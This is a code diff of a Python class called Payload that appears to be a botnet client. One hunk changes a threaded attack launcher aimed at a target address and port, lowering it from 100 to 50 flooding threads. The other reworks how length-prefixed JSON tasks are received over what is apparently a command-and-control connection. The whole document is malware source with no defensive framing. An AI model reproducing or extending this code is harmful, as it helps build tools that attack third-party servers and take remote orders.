@@ -94,7 +94,7 @@ class Payload():
         def run(target_address, target_port=8080):
             stop_event = threading.Event()
             threads = []
-            for _ in range(100):
+            for _ in range(50):
                 thread = threading.Thread(target=attack, args=(target_address, target_port, stop_event))
                 thread.start()
                 threads.append(thread)
@@ -231,18 +231,10 @@ class Payload():
     def recv_task(self):
         try:
             header_size = struct.calcsize('!L')
-            header = self.connection.recv(header_size)
-            msg_size = struct.unpack('!L', header)[0]
-            msg = self.connection.recv(msg_size)
-            data = msg.decode('utf-8')
-            self.connection.settimeout(0.1)  
-            try:
-                while True:
-                    self.connection.recv(4096) 
-            except socket.timeout:
-                pass 
-            finally:
-                self.connection.settimeout(None)
+            msg = self.connection.recv(4096)
+            header = msg[:header_size]
+            data_size = struct.unpack('!L', header)[0]
+            data = msg[header_size:header_size+data_size].decode('utf-8')
             return json.loads(data)
         except Exception as e:
             log(f"{self.recv_task.__name__}: {str(e)}", level='error') 
